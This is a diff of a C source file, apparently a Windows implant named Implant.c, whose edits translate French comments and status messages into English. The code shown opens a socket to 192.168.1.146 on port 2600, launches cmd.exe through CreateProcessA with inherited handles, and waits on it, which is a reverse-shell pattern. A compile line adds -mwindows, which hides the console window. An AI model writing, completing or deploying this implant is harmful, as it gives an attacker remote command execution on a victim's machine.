@@ -1,6 +1,6 @@
 #include "implant.h"
 // Compilation command: x86_64-w64-mingw32-gcc Implant.c -o implant.exe -lws2_32
-// futiv command : x86_64-w64-mingw32-gcc implant.c -o implant.exe -lws2_32 -mwindows
+// futiv command : x86_64-w64-mingw32-gcc Implant.c -o implant.exe -lws2_32 -mwindows
 int main(){
 // Set variables
     char rcvbuffer[DEFAULT_BUFLEN];
@@ -33,22 +33,22 @@ int main(){
     server.sin_port = htons(2600);
     server.sin_addr.s_addr = inet_addr("192.168.1.146");
 
-    // 1. On vérifie si la connexion marche vraiment
+    // Check the connexion
     if (connect(soc, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
-        printf("[!] Erreur de connexion.\n");
+        printf("[!] connexion error\n");
         return 1;
     }
-    printf("[+] Connecte au serveur !\n");
+    printf("[+] connected !\n");
 
-    // 2. On lance cmd.exe et on VÉRIFIE s'il a réussi
+    
     if (!CreateProcessA(
         NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo
     )) {
-        // S'il échoue, GetLastError() nous donnera le code d'erreur précis de Windows
-        printf("[!] Erreur CreateProcess: %lu\n", GetLastError());
+        // print error
+        printf("[!] error CreateProcess: %lu\n", GetLastError());
         return 1;
     }
-    printf("[+] CMD.exe lance avec succes. En attente...\n");
+    printf("[+] CMD.exe successfully ran. waiting...\n");
 
 
     WaitForSingleObject(pinfo.hProcess, INFINITE);
